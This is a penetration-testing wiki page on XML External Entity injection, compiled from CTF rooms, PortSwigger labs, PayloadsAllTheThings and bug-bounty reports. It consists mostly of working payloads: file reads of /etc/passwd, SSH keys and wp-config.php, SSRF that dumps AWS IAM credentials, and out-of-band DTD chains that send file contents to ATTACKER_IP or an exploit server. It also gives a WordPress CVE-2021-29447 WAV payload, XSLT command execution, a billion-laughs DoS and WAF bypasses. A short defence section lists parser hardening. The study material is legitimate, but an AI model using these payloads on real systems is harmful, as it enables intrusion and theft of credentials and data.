---
title: "XXE Injection"
type: technique
tags: [exploitation, h1, injection, ssrf, thm, web, xxe]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-07-21
sources: [thm-adv-xxe, thm-cve-wp-xxe, thm-web-xxe-ctf, h1-scraped-xxe, payloadsallthethings-xxe, git-payloadsallthethings, git-portswigger-all-labs]
---

# XXE Injection

Quick payloads: [[payloads/xxe]].

## What it is

XML External Entity (XXE) injection exploits vulnerabilities in XML parsers that are configured to process external entity declarations. An attacker injects a malicious DTD (Document Type Definition) that defines an external entity referencing a local file, internal URL, or attacker-controlled server. When the parser expands the entity, it reads the target resource and returns its contents in the application response (in-band) or sends it out-of-band to the attacker.

## How it works

XML documents can define entities — named placeholders expanded by the parser. External entities reference resources outside the document using the `SYSTEM` keyword. When an XML parser resolves external entities without restriction, an attacker can point them at arbitrary files or URLs:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

When the parser encounters `&xxe;` in the document body, it replaces it with the contents of `/etc/passwd`.

DTDs (Document Type Definitions) declare the structure and entity definitions for an XML document. Internal DTDs appear inline in the `<!DOCTYPE>` declaration. External DTDs are fetched from a URL. Parameter entities (`%name;`) are used within DTDs and allow constructing nested entity declarations — the foundation of out-of-band exfiltration chains.

## Prerequisites

- The application accepts XML input (direct XML API, SOAP endpoint, file upload that is XML-based)
- The XML parser has external entity resolution enabled (the default in many languages before security hardening)
- For file read: the web server process has read permission on the target file
- For OOB: the server can make outbound HTTP/DNS requests

## Methodology

### 1. Identify XML parsing

- Look for endpoints accepting XML in POST bodies (`Content-Type: application/xml`, `text/xml`)
- Look for file uploads accepting `.xml`, `.svg`, `.docx`, `.xlsx`, `.wav` (iXML), `.pdf`
- Inspect requests for SOAP/XML-RPC API calls
- Source code or comments referencing XML parsing

### 2. In-band XXE — file disclosure

Inject into the XML body sent to the endpoint. The application must reflect the entity's value in its response:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```

**PHP Wrapper Inside XXE:**
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

The response contains the `/etc/passwd` contents wherever `&xxe;` was referenced.

Common files to target:
- `/etc/passwd` — confirm exploit, identify users
- `/etc/hosts` — internal network layout
- `/proc/self/environ` — environment variables (may contain secrets)
- `wp-config.php` — WordPress database credentials
- `/home/<user>/.ssh/id_rsa`

### 3. XXE SSRF — internal network scanning

Use the external entity to make the server issue HTTP requests:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:§PORT§/" >
]>
<contact>
  <name>&xxe;</name>
  ...
</contact>
```

Use Burp Intruder to iterate port numbers from 1 to 65535. Responses with non-default length indicate open services. This technique can reach internal admin panels, metadata endpoints, and microservices.

**AWS Instance Metadata enumeration via XXE SSRF** — walk the metadata API incrementally; each response reveals the next path level:

```xml
<!-- Step 1: root -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/">
<!-- Returns: "latest" -->

<!-- Step 2: meta-data listing -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!-- Returns: ami-id, hostname, iam/, instance-id ... -->

<!-- Step 3: IAM roles -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!-- Returns role name, e.g. "admin" -->

<!-- Step 4: dump credentials -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
```

| AWS Metadata Path | Description |
|---|---|
| `/latest/meta-data/` | Root metadata directory |
| `/latest/meta-data/instance-id` | EC2 instance ID |
| `/latest/meta-data/hostname` | Hostname |
| `/latest/meta-data/iam/security-credentials/` | IAM roles list |
| `/latest/meta-data/iam/security-credentials/<role>` | Access Key, Secret Key, Token |

### 4. Out-of-band (OOB) XXE

When the application does not reflect the entity value, use parameter entities and an external DTD to exfiltrate data to an attacker-controlled server.

**Detection first — regular entity OOB (simplest confirm):**

If parameter entities are blocked ("Entities are not allowed for security reasons"), fall back to a regular general entity pointing at your Collaborator domain:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR.oastify.com"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

The response will say "Invalid product ID" (entity not reflected) but Burp Collaborator will register a DNS/HTTP hit — confirming blind XXE.

**Parameter entity OOB (when regular entities are blocked):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR.oastify.com">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

Parameter entities (`%name;`) are declared with `%` and can only be invoked inside the DTD — reference `%xxe;` immediately after its declaration. No body-level `&xxe;` reference is needed.

**Step 1:** Start an HTTP server on your attack machine:

```bash
python3 -m http.server 1337
```

**Step 2:** Create a DTD file (`sample.dtd`) on your server:

```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```

**Step 3:** Reference the external DTD in the XML payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```

The server fetches `sample.dtd` from your server, expands `%cmd` (reading and base64-encoding `/etc/passwd`), then makes a second request to `/?data=<base64>`. Decode the received base64 value:

```bash
echo "BASE64_DATA" | base64 -d
```

**OOB with DNS (detect-only):**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR.oastify.com" >
]>
```

A DNS hit confirms the vulnerability even if HTTP is filtered.

### 5. Error-based XXE

When the application displays error messages, trigger an error that includes the file content by referencing a non-existent file path that incorporates the entity value:

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

The parser error message will contain the path including the file contents.

**Using Local DTD Files:**
If outbound traffic is blocked, you can repurpose an existing DTD file on the target system to trigger an error-based leak.
- **Linux:** `/usr/share/xml/fontconfig/fonts.dtd` (has `%constant;` entity)
- **Linux (Yelp/GNOME):** `/usr/share/yelp/dtd/docbookx.dtd` (has `%ISOamso;` entity)
- **Windows:** `C:\Windows\System32\wbem\xml\cim20.dtd`

**Local DTD repurposing technique** — override a parameter entity already declared in the system DTD to smuggle your error-based exfiltration chain. Useful when external DTD loading is blocked (no outbound HTTP) but the parser still resolves local `file://` references:

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

How it works:
1. `%ISOamso` is redefined before `%local_dtd;` is invoked.
2. When `docbookx.dtd` is loaded, it calls `%ISOamso;` — which now contains your payload.
3. `%eval;` builds a `%error;` entity referencing `/nonexistent/<passwd_contents>`.
4. `%error;` triggers a parser error leaking the file contents in the error message.

To find which entity name to override, test by loading the DTD and examining the error, or look up known entity names in the DTD source. The `%ISOamso` entity is a reliable target in `docbookx.dtd` on Debian/Ubuntu systems.

### 6. XInclude Attacks

When you cannot modify the `DOCTYPE` element — for example, when you only control a single parameter value in a form-encoded request that the server embeds into a larger XML document — use `XInclude`:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**XInclude via URL-encoded form POST** (when you control only a parameter value, not the full XML body):

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

productId=%3Cfoo+xmlns%3Axi%3D%22http%3A//www.w3.org/2001/XInclude%22%3E%3Cxi%3Ainclude+parse%3D%22text%22+href%3D%22file%3A///etc/passwd%22/%3E%3C/foo%3E&storeId=1
```

Decoded `productId` value:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Use this when:
- You do not control the full XML document, only a single tag value or attribute.
- The application reflects or processes the injected element's content.
- The server uses an XML parser with XInclude processing enabled.

### 7. Denial of Service (Billion Laughs)

:warning: This attack might kill the service; do not use it on production.
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

### 8. XXE via SVG upload

SVG files are XML; if the application processes uploaded SVGs (e.g., to render a thumbnail), inject XXE in the SVG:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### 9. XXE via Office documents (.docx, .xlsx)

Office Open XML formats are ZIP archives containing XML files. Inject the XXE payload into one of the inner XML files (e.g., `word/document.xml`, `xl/workbook.xml` or `xl/sharedStrings.xml`), repack the archive (`zip -u`), and upload or submit it.

## XML entity types — quick reference

| Entity Type | Declaration Syntax | Usage | Where Invoked |
|---|---|---|---|
| Internal entity | `<!ENTITY name "value">` | `&name;` | XML body |
| External general entity | `<!ENTITY name SYSTEM "URI">` | `&name;` | XML body |
| Parameter entity | `<!ENTITY % name SYSTEM "URI">` | `%name;` | Inside DTD only |
| External parameter entity | `<!ENTITY % name SYSTEM "http://attacker.com/x.dtd">` | `%name;` | Inside DTD only |
| Predefined entity | *(built-in)* | `&lt;` `&gt;` `&amp;` | XML body |
| Numeric entity | *(built-in)* | `&#x25;` `&#37;` | XML body or DTD |

Key distinction: **general entities** (`&name;`) can be referenced in the XML body; **parameter entities** (`%name;`) can only be used inside DTD declarations. This is why OOB exfiltration chains nest the data-exfil logic entirely within the DTD using parameter entities.

## Bypasses and variants

### WAF Bypass via Character Encoding

XML parsers detect encoding based on the HTTP `Content-Type` header, Byte Order Mark (BOM), or XML declaration (`<?xml encoding="UTF-8"?>`). Convert payloads to `UTF-16` using `iconv` to bypass WAFs that only inspect UTF-8 traffic:
```bash
cat exploit.xml | iconv -f UTF-8 -t UTF-16BE > exploit_utf16.xml
```

### XXE on JSON Endpoints

Change `Content-Type: application/json` to `application/xml` or `text/xml`. If the server accepts it and tries to parse the body as XML, inject an XXE payload.
```json
// From: {"search":"name"}
// To: <?xml version="1.0" encoding="UTF-8"?><root><search>name</search></root>
```

## CVE-2021-29447 — WordPress Media Library XXE

WordPress running on PHP 8 is vulnerable to XXE via the Media Library when an authenticated user (with media upload permissions) uploads a malicious WAV file containing iXML metadata.

**Impact:** Arbitrary file read from the server (including `wp-config.php`), SSRF.

**Create malicious WAV:**

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://ATTACKER_IP:PORT/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

**DTD file (`evil.dtd`) on attacker server:**

```xml
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://ATTACKER_IP:PORT/?p=%file;'>">
```

**Serve the DTD and receive the exfiltrated data:**

```bash
php -S 0.0.0.0:PORT
```

Upload `payload.wav` to WordPress Media Library. The server fetches your DTD and sends back the zlib+base64 encoded file. Decode with:

```php
<?php echo zlib_decode(base64_decode('BASE64_HERE')); ?>
```

Or with base64 only (simpler DTD):

```bash
echo "BASE64_HERE" | base64 -d
```

The `wp-config.php` file exposes database credentials, which can be used to access MySQL directly or escalate further.

## Key payloads / examples

### Basic file read (in-band)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><value>&xxe;</value></data>
```

### SSRF via XXE

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.0.68/admin">]>
<data><value>&xxe;</value></data>
```

### OOB — trigger outbound request

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/">]>
<data><value>&xxe;</value></data>
```

### OOB data exfiltration (full chain)

DTD on attacker server:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?d=%file;'>">
%oobxxe;
```

Payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE x SYSTEM "http://ATTACKER_IP:1337/evil.dtd">
<x>&exfil;</x>
```

### Mustachio CTF — XXE to read SSH key

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/home/barry/.ssh/id_rsa">]>
<comment>
  <name>Joe</name>
  <author>Barry</author>
  <com>&example;</com>
</comment>
```

## Real-World Examples (HackerOne — paid reports)

| Program | Title | Severity | Bounty | Report |
|---------|-------|----------|--------|--------|
| Rockstar Games | LFI and SSRF via XXE in emblem editor | Critical | $1,500 | [#347139](https://hackerone.com/reports/347139) |
| VK.com | Blind XXE on pu.vk.com | Medium | $500 | [#296622](https://hackerone.com/reports/296622) |

**Patterns:** XXE in image/emblem editors that parse SVG or XML server-side is a recurring target — Rockstar's emblem editor chained LFI+SSRF for critical impact. Blind XXE (out-of-band via DNS/HTTP) works even when no error output is returned.

## Detection and defence

- **Disable external entity processing** in the XML parser — this is the primary fix

**PHP:**
```php
libxml_disable_entity_loader(true);
```

**Java:**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**.NET:**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
```

**Python:**
```python
from defusedxml.ElementTree import parse
et = parse(xml_input)
```

- **Use JSON instead of XML** where possible — JSON has no entity expansion mechanism
- **Input validation and allowlisting** — validate XML against a strict schema; reject DOCTYPE declarations
- **Network egress filtering** — prevent the server from making outbound requests to arbitrary hosts (mitigates OOB exfiltration and SSRF)
- **Keep XML libraries patched** — many CVEs in XML parsers have been resolved in updates

## Tools

- [[burp-suite]] — Intruder for port scanning via SSRF, Repeater for manual XXE
- Python `http.server` — receive OOB callbacks
- `php -S` — serve DTD files for OOB chain
- Burp Collaborator — detect blind XXE via DNS/HTTP OOB
- WPScan — identify vulnerable WordPress versions

## Sources

- THM Advanced Web — XXE Injection room
- THM CVE — WP XXE CVE-2021-29447
- THM CTF: Mustachio (XXE file read + SSH key extraction)

## From the Wild

### HTB — Clicker (2023)
- **Technique variant**: NFS, SQL Injection (CRLF), Perl Privilege Escalation
- **Attack path**: Mount NFS share, CRLF injection to set admin role, Perl environment variable injection for root

### HTB — Snoopy (2023)
- **Technique variant**: DNS Zone Transfer, Bind9 CVE, SSH MitM via DNS Hijack
- **Attack path**: DNS enumeration, exploit Bind9 CVE to update DNS, MitM SSH via DNS redirect, Git hook abuse for root

### HTB — Pollution (2022)
- **Technique variant**: XXE, Redis Exploitation, Prototype Pollution to RCE
- **Attack path**: XXE for internal access, Redis command injection, JavaScript prototype pollution for code execution as root

### HTB — MetaTwo (2022)
- **Technique variant**: WordPress BookingPress SQLi + XXE
- **Attack path**: SQLi in WordPress BookingPress plugin (CVE-2022-0739), XXE in WordPress media upload (CVE-2021-29447), crack Passpie PGP for root

### HTB — RedPanda (2022)
- **Technique variant**: Spring Boot SSTI + XXE Cron
- **Attack path**: SSTI in Java Spring Boot search for shell, exploit XXE in log parser cron job to read root SSH key

### HTB — Fulcrum (2017)
- **Technique variant**: Multi-pivot (Linux/Windows), PowerShell, XXE
- **Attack path**: Chain XXE through multiple network pivots across Linux and Windows hosts

### HTB — NodeBlog (2022)
- **Technique variant**: NoSQL Injection + XXE + Deserialization
- **Attack path**: NoSQL injection to bypass login, XXE in blog XML parsing, node-serialize deserialization RCE, MongoDB creds for root

### HTB — Patents (2020)
- **Technique variant**: XXE (Docx Upload), LFI, Custom Binary Exploit
- **Attack path**: XXE via DOCX upload to read files, LFI chain, exploit custom binary with format string for root

---

## XSLT Injection
Processing an un-validated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code.

**Read Files / SSRF via document():**
```xml
<xsl:copy-of select="document('/etc/passwd')"/>
<xsl:copy-of select="document('http://127.0.0.1:8080/admin')"/>
```

**RCE via PHP Wrapper (php:function):**
If the `php` namespace is enabled (`xmlns:php="http://php.net/xsl"`), you can call PHP functions directly:
```xml
<xsl:value-of select="php:function('system','id')" />
```

**RCE via Java (rt:getRuntime):**
```xml
<xsl:variable name="rtobject" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
```

## Payload reference (PayloadsAllTheThings)

Additional payload forms from PAT covering XLSX injection, SOAP, local DTD error-based exfiltration, and character encoding WAF bypass not covered in the sections above.

### Error-based XXE using Windows local DTD

```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'
    >
    %local_dtd;
]><xxx>anything</xxx>
```

### XXE in SOAP request

```xml
<soap:Body>
  <foo>
  <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://ATTACKER:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

### XXE in XLSX (sharedStrings.xml)

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://ATTACKER:8000/xxe.dtd">%asd;%c;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
  <si><t>&rrr;</t></si>
</sst>
```

Remote `xxe.dtd`:
```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://ATTACKER:2121/%d;'>">
```

### Character encoding WAF bypass

```bash
# Convert UTF-8 payload to UTF-16BE to bypass WAFs inspecting only UTF-8
cat exploit.xml | iconv -f UTF-8 -t UTF-16BE > exploit_utf16.xml
```

Pair with `Content-Type: application/xml; charset=UTF-16BE`.

## PortSwigger Labs

All labs use a "Check Stock" feature that sends a POST to `/product/stock` with `Content-Type: application/xml`. The baseline XML body:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

### Lab 1 — Exploiting XXE to retrieve files (Apprentice)

Inject a `DOCTYPE` entity targeting `/etc/passwd` and replace the `productId` value with the entity reference:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

The file contents are reflected back in the error message ("Invalid product ID: root:x:0:0...").

### Lab 2 — Exploiting XXE to perform SSRF attacks (Apprentice)

Walk the AWS instance metadata API incrementally — each response reveals the next path component:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Start at `http://169.254.169.254/` and follow directory listings: `latest` → `meta-data/` → `iam/` → `security-credentials/` → `<role-name>`. The final response contains `AccessKeyId`, `SecretAccessKey`, and `Token`.

### Lab 3 — Blind XXE with out-of-band interaction (Practitioner)

Confirm blind XXE when no data is reflected. Use a regular general entity pointing at Burp Collaborator:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR.oastify.com"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

If `%parameter;` entities are blocked with "Entities are not allowed", try a regular `<!ENTITY xxe SYSTEM ...>` instead. Check Burp Collaborator for DNS/HTTP hits.

### Lab 4 — Blind XXE via XML parameter entities (Practitioner)

When regular entities are also blocked, declare a parameter entity and invoke it inside the DTD directly — no body-level reference needed:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR.oastify.com">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

### Lab 5 — Blind XXE to exfiltrate data via malicious external DTD (Practitioner)

Host a DTD file on your exploit server, then load it from the target. The DTD exfiltrates file contents via an HTTP query parameter:

**malicious.dtd** (hosted on exploit server):
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://YOUR-EXPLOIT-SERVER/?x=%file;'>">
%eval;
%exfiltrate;
```

**Payload sent to target:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://YOUR-EXPLOIT-SERVER/malicious.dtd">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

Monitor exploit server access logs for `GET /?x=<hostname>`. Can also use Burp Collaborator instead of a self-hosted exploit server.

### Lab 6 — Blind XXE via error messages (Practitioner)

Application returns XML parsing errors but not entity values. Host a malicious DTD that causes an error path containing the file contents:

**malicious.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://YOUR-EXPLOIT-SERVER/malicious.dtd">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

The parser throws: `Error: file not found: /nonexistent/root:x:0:0:root:/root:/bin/bash...` — the error message contains `/etc/passwd` contents. Note: even though the error is in-band, you still need the external DTD to chain nested parameter entities (browsers block inline nested parameter entity declarations in DTDs).

### Lab 7 — Exploiting XInclude to retrieve files (Practitioner)

The application embeds a user-controlled value into a server-side XML document — you cannot add a `DOCTYPE`. Inject an XInclude directive as the parameter value via URL-encoded form POST:

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

productId=%3Cfoo+xmlns%3Axi%3D%22http%3A//www.w3.org/2001/XInclude%22%3E%3Cxi%3Ainclude+parse%3D%22text%22+href%3D%22file%3A///etc/passwd%22/%3E%3C/foo%3E&storeId=1
```

Decoded `productId` value: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`

### Lab 8 — Exploiting XXE via image file upload (Practitioner)

The application accepts image uploads and processes them server-side (e.g., Apache Batik for SVG rendering). Upload a malicious SVG:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="300" height="200" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

- Set `Content-Type: image/svg+xml` in the upload request.
- Attach as avatar/profile image and submit a comment.
- Open the avatar URL in a new tab — the rendered SVG displays the contents of `/etc/hostname` as visible text.
- First test OOB (point entity at Collaborator domain) to confirm the parser processes SVGs before attempting file read.

### Lab 9 — Exploiting XXE to retrieve data by repurposing a local DTD (Expert)

All external DTD loading is blocked; OOB channels are filtered. Repurpose a local system DTD by overriding one of its declared parameter entities before loading it:

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

Steps:
1. Confirm the local DTD exists by trying `<!ENTITY test SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">` — a parser error (not "file not found") confirms the file is present.
2. `%ISOamso` is a parameter entity that `docbookx.dtd` declares and invokes; by redefining it before loading the DTD, your payload runs when the DTD calls `%ISOamso;`.
3. The error message leaks `/etc/passwd` contents inline.

Other known overridable entities in system DTDs:
- `%constant;` in `/usr/share/xml/fontconfig/fonts.dtd` (Linux)
- `%SuperClass;` in `C:\Windows\System32\wbem\xml\cim20.dtd` (Windows)

## Related

- [[wiki/techniques/web/ssrf]] (external entities turn the XML parser into an SSRF client)
- [[file-upload]] (SVG, DOCX, and XML uploads are prime XXE entry points)
- [[path-traversal-lfi]] (XXE file:// entities read arbitrary local files)

## Picking the reflected element in a multi-field XML body

When the XML the app parses has several child elements but only ONE is echoed back, the external
entity must be placed in the reflected element, not just the first field. Fingerprint the sink
first with benign values: send distinct markers in each element and see which one comes back
(e.g. `<name>AAA</name><search>BBB</search>` -> response contains `BBB` => `search` is the sink).
Then move `&xxe;` into that element. An entity in a non-reflected element parses fine but returns
nothing, which reads like a failed XXE when the bug is real.

PHP tell: source with `libxml_disable_entity_loader(false)` plus `loadXML($x, LIBXML_NOENT |
LIBXML_DTDLOAD)` is external-entity resolution deliberately re-enabled = XXE by construction.

<!-- promoted-slug: xxe-reflected-element-selection -->
